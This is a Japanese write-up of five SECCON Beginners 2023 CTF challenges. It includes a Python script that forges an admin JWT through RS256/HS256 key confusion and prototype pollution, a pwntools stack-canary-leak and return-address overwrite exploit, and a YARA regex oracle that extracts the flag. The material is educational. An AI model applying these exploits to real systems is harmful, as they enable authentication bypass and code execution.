# SECCON Beginners 2023 Writeup

## 目次

- Web
  - [Forbidden](#forbidden)
  - [double check](#double-check)
- Pwnable
  - [poem](#poem)
  - [rewriter2](#rewriter2)
- Misc
  - [YARO](#yaro)

## Forbidden

Express.jsでパスに`/flag`を含めずに`/flag`へのGETリクエストを送信できればよい。case insennsitiveであるため、`/FLAG`や`/Flag`などが通る。

## double check

JWTでRS256とHS256の両方を許可しているため、RS256公開鍵をHS256共有鍵として使用する攻撃が使える。また、adminチェックではusernameとpasswordのどちらか、または両方がadminユーザーの情報と一致しない場合`verified = _.omit(verified, ["admin"]);`によってadminパラメータが削除される。Prototype Pollutionを使用することで削除を回避し、token.adminとuser.adminをtrueにすることができる。具体的には以下のPythonスクリプトでflagが得られる。

```py
import jwt
import requests


url = "https://double-check.beginners.seccon.games"

# Prototype Pollution
payload = {
    "username": "admin",
    "__proto__": {
        "admin": True
    },
    "iat": 1685828626,
    "exp": 1685832226
}

# 最新バージョンのPyJWTがHS256でRSAの公開鍵を使うことができないため、使えるようにするためのパッチ
def prepare_key(key):
    return jwt.utils.force_bytes(key)

jwt.api_jws._jws_global_obj._algorithms['HS256'].prepare_key = prepare_key

# RSA256用の公開鍵
public_key = open('./app/keys/public.key', 'r').read()

token = jwt.encode(
    payload=payload,
    key=public_key,
    algorithm="HS256"
)
print(token)

# セッションクッキーの取得
req = requests.get(url)
cookie = req.cookies.get("connect.sid")
user = {"username": "admin", "password": "pass"}

# ユーザー登録
headers1 = {"Content-Type": "application/json"}
req2 = requests.post(
    url + "/register",
    json=user,
    cookies=req.cookies,
    headers=headers1
)
print(req2.text)

# 改ざんしたJWTを用いてフラグを取得
headers2 = {"Authorization": token}
req3 = requests.post(
    url + "/flag",
    cookies=req.cookies,
    headers=headers2
)
print(req3.text)
```

## poem

0から4の整数値を受け取るようになっており、入力値のチェックとして`n < 5`であることが確認されている。しかし負の値に関しては制限なく通せるため、後ろ側への範囲外アクセスが可能。`-4`を入力することでflagが得られる。

## rewriter2

まずchecksecの結果は以下となる。カナリアがある。
```bash
$ checksec rewriter2
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

実行してみると、スタックの様子が出力され、入力が求められる。

```
$ ./rewriter2

 [Addr]             | [Value]
====================+===================
 0x00007fffe2e1f8d0 | 0x0000000000000002  <- buf
 0x00007fffe2e1f8d8 | 0x00007f28769e9780
 0x00007fffe2e1f8e0 | 0x0000000000000000
 0x00007fffe2e1f8e8 | 0x00007f287685d475
 0x00007fffe2e1f8f0 | 0x0000000000001000
 0x00007fffe2e1f8f8 | xxxxx hidden xxxxx  <- canary
 0x00007fffe2e1f900 | 0x0000000000000001  <- saved rbp
 0x00007fffe2e1f908 | 0x00007f28767f8d90  <- saved ret addr
 0x00007fffe2e1f910 | 0x00007f28769e5600
 0x00007fffe2e1f918 | 0x00000000004011f6

What's your name?
```

ソースコードを見ると、BUF_SIZE=0x20に対してREAD_SIZE=0x100でreadしており、BOFが可能な箇所が2か所ある。1回目でカナリアをリークさせ、2回目でカナリアを回避しながらリターンアドレスをwinのアドレスに書き換えることを考える。  
だが単純にwinのアドレスに飛ばしても`Congulatulation!`が出力されたあとにsystem関数でセグフォが発生し、落ちてしまう。これはスタックのアライメントがずれていることが原因であり、ret gadgetを探し、winのアドレスの前に挟むことでrspをずらすとシェルが得られる。

```py
from pwn import *

binary = './rewriter2'
context.binary = binary

io = process(binary)

#io = remote('rewriter2.beginners.seccon.games', 9001)
io.recvuntil(b"What's your name? ")
BUF_SIZE = 0x20
READ_SIZE = 0x100

offset = BUF_SIZE + 8

win_addr = p64(0x04012c2)
ret_addr = p64(0x4012c1)  # 適当なret gadget 参考: https://sok1.hatenablog.com/entry/2022/01/17/050710

# Leak Canary
payload1 = b"A" * offset
io.sendline(payload1)
print(io.recvuntil(b"Hello, " + payload1))

canary = io.recv(8)
print("canary", canary)
canary = b"\x00" + canary[1:]  # 先頭が'\n'で上書きされてるので'\x00'に修正
print(io.recvuntil("How old are you?").decode("utf-8", errors="ignore"))

rbp = p64(0x1)
payload2 = b"A" * offset + canary + rbp + ret_addr + win_addr
io.sendline(payload2)
io.interactive ()
```

## YARO

任意のYARAルールを送信してファイルを検査できる。ファイルの中身がルールで記述した正規表現にマッチするかを判定できるため、オラクルでflagファイルの中身を特定することができる。  
まず文字種と文字数を探索すると、ctf4b{}の中は`ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_`で構成されており、また文字数は28文字であることがわかる。  
ルールを複数書くことができるため、n番目の文字が文字種内のどの文字に一致するかを一度で特定できるルールを記述することで、28回の試行でflag全体を特定することができる(より効率化するのであれば二分探索が可能だが、今回は実装が面倒なためやらなかった)。

```
rule rule_A {strings:$flag = /^ctf4b\{A\w+\}/ condition:$flag}
rule rule_B {strings:$flag = /^ctf4b\{B\w+\}/ condition:$flag}
rule rule_C {strings:$flag = /^ctf4b\{C\w+\}/ condition:$flag}
...
rule rule_A {strings:$flag = /^ctf4b\{YA\w+\}/ condition:$flag}
rule rule_B {strings:$flag = /^ctf4b\{YB\w+\}/ condition:$flag}
rule rule_C {strings:$flag = /^ctf4b\{YC\w+\}/ condition:$flag}
...
```